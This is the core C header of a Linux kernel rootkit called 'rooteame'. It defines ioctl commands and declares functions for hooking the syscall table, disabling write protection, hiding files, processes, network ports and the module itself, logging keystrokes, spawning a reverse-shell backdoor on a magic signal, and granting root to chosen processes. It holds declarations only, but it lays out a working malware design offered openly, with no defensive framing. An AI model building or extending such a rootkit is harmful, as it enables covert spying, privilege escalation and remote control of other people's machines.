#ifndef _ROOTEAME_CORE_H
#define _ROOTEAME_CORE_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include <linux/stat.h>
#include <linux/dirent.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/tcp.h>
#include <linux/workqueue.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/file.h>
#include <linux/fs_struct.h>
#include <linux/pid.h>
#include <asm/cacheflush.h>
#include <asm/io.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>

/* -- Module metadata -- */
#define ROOTEAME_NAME    "rooteame"
#define ROOTEAME_VERSION "3.0"
#define ROOTEAME_AUTHOR  "ruby570bocadito"
#define ROOTEAME_TAG     "[rooteame]"

#define DEVICE_NAME      "rooteame"
#define CLASS_NAME       "rooteame"

/* -- Syscall hook definitions -- */
#define MAX_HOOKS        12
#define MAX_HIDDEN_FILES 128
#define MAX_HIDDEN_PIDS  64
#define MAX_HIDDEN_PORTS 32
#define MAX_KEYLOG_BUF   4096

/* -- IOCTL commands -- */
#define ROOTEAME_MAGIC 0xC0

#define IOCTL_GIVE_ROOT        _IO(ROOTEAME_MAGIC, 0x01)
#define IOCTL_HIDE_FILE        _IOW(ROOTEAME_MAGIC, 0x02, char[256])
#define IOCTL_UNHIDE_FILE      _IOW(ROOTEAME_MAGIC, 0x03, char[256])
#define IOCTL_HIDE_PID         _IOW(ROOTEAME_MAGIC, 0x04, int)
#define IOCTL_UNHIDE_PID       _IOW(ROOTEAME_MAGIC, 0x05, int)
#define IOCTL_HIDE_PORT        _IOW(ROOTEAME_MAGIC, 0x06, uint16_t)
#define IOCTL_UNHIDE_PORT      _IOW(ROOTEAME_MAGIC, 0x07, uint16_t)
#define IOCTL_LIST_HIDDEN      _IOR(ROOTEAME_MAGIC, 0x08, char[4096])
#define IOCTL_KEYLOG_READ      _IOR(ROOTEAME_MAGIC, 0x09, char[4096])
#define IOCTL_KEYLOG_CLEAR     _IO(ROOTEAME_MAGIC, 0x0A)
#define IOCTL_BACKDOOR_SHELL   _IOW(ROOTEAME_MAGIC, 0x0B, char[256])
#define IOCTL_BACKDOOR_MAGIC   _IOW(ROOTEAME_MAGIC, 0x0C, char[16])
#define IOCTL_MODULE_HIDE      _IO(ROOTEAME_MAGIC, 0x0D)
#define IOCTL_MODULE_UNHIDE    _IO(ROOTEAME_MAGIC, 0x0E)

/* -- Hooked syscall entry -- */
struct hooked_syscall {
    unsigned long *table_entry;
    unsigned long original;
    unsigned long hooked;
    const char *name;
};

#include <linux/kprobes.h>
#include <asm/processor.h>
#include <asm/special_insns.h>
#include <asm/processor-flags.h>

/* -- Globals -- */
extern unsigned long *sys_call_table;
extern struct hooked_syscall hooks[];
extern int hooks_count;
extern int module_hidden;

/* Hook indices (used across files) */
#define HOOKIDX_GETDENTS64  0
#define HOOKIDX_GETDENTS    1
#define HOOKIDX_OPENAT      2
#define HOOKIDX_READ        3
#define HOOKIDX_KILL        4
#define HOOKIDX_WRITE       5
#define HOOKIDX_UNLINKAT    6

/* Exposed arrays for ioctl listing */
extern char hidden_files[MAX_HIDDEN_FILES][256];
extern int hidden_file_count;
extern int hidden_pids[MAX_HIDDEN_PIDS];
extern int hidden_pid_count;
extern uint16_t hidden_ports[MAX_HIDDEN_PORTS];
extern int hidden_port_count;

/* -- Function declarations -- */

/* hooking.c */
int hooking_init(void);
void hooking_cleanup(void);
unsigned long *find_sys_call_table(void);
int disable_wp(void);
void restore_wp(int saved_cr0);
int install_hook(struct hooked_syscall *h);
void remove_hook(struct hooked_syscall *h);

/* file_hide.c */
asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp,
                                   unsigned int count);
asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dirp,
                                  unsigned int count);
asmlinkage long hooked_openat(int dirfd, const char __user *pathname,
                               int flags, umode_t mode);
asmlinkage long hooked_unlinkat(int dirfd, const char __user *pathname, int flags);
asmlinkage long hooked_write(unsigned int fd, const char __user *buf, size_t count);
void file_hide_add(const char *name);
void file_hide_del(const char *name);
int file_hide_init(void);
void file_hide_cleanup(void);
int is_file_hidden(const char *name);

/* proc_hide.c */
void proc_hide_add(int pid);
void proc_hide_del(int pid);
int proc_hide_init(void);
void proc_hide_cleanup(void);
int is_pid_hidden(int pid);
int is_proc_pid_hidden(const char *d_name);
asmlinkage long hooked_kill(pid_t pid, int sig);

/* net_hide.c */
void net_hide_add_port(uint16_t port);
void net_hide_del_port(uint16_t port);
int net_hide_init(void);
void net_hide_cleanup(void);
asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf,
                               size_t count);

/* keylogger.c */
int keylogger_init(void);
void keylogger_cleanup(void);
int keylogger_read(char __user *buf, size_t count);
void keylogger_clear(void);

/* backdoor.c */
int backdoor_init(void);
void backdoor_cleanup(void);
int backdoor_trigger_shell(const char *ip, const char *port);
int backdoor_set_magic(const char *magic);
int backdoor_spawn_reverse_shell(const char *ip, int port);
int backdoor_check_magic(pid_t pid, int sig);

/* priv_esc.c */
int priv_esc_give_root(pid_t pid);

/* stealth.c */
int stealth_init(void);
void stealth_cleanup(void);
int stealth_hide_module(void);
int stealth_unhide_module(void);

/* ioctl.c */
int ioctl_init(void);
void ioctl_cleanup(void);

#endif /* _ROOTEAME_CORE_H */
